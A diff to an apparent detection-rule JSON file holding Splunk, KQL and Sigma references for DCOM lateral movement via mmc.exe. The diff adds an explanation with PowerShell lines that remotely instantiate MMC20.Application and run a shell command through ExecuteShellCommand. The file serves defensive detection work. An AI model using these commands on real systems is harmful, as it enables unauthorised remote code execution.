@@ -105,5 +105,6 @@
     "splunk_spl": "index=sysmon EventCode=1 ParentImage=\"*mmc.exe\" (Image=\"*cmd.exe\" OR Image=\"*powershell.exe\")\n| table _time, Computer, User, Image, CommandLine, ParentImage\n\nindex=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4624 Logon_Type=3\n| where Logon_Process=\"NtLmSsp\" AND Process_Name=\"*mmc.exe\"\n| table _time, Account_Name, Source_Network_Address",
     "elastic_kql": "event.code:\"1\" AND process.parent.executable:*mmc.exe AND (process.name:cmd.exe OR process.name:powershell.exe)\n\nevent.code:\"4624\" AND winlog.event_data.LogonType:\"3\" AND process.name:*mmc.exe",
     "sigma_rules": "proc_creation_win_dcom_lateral_movement"
-  }
+  },
+  "explain": "Lateral movement via DCOM by driving a remote COM object (needs local admin on the target):\n  [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"<target_ip>\"))   remotely instantiate the MMC20.Application object over RPC (port 135)\n  $dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c <payload>\",\"7\")   use its ExecuteShellCommand method to run your command\nExecution happens under the DCOM object's process - stealthier than psexec since no service is created."
 }
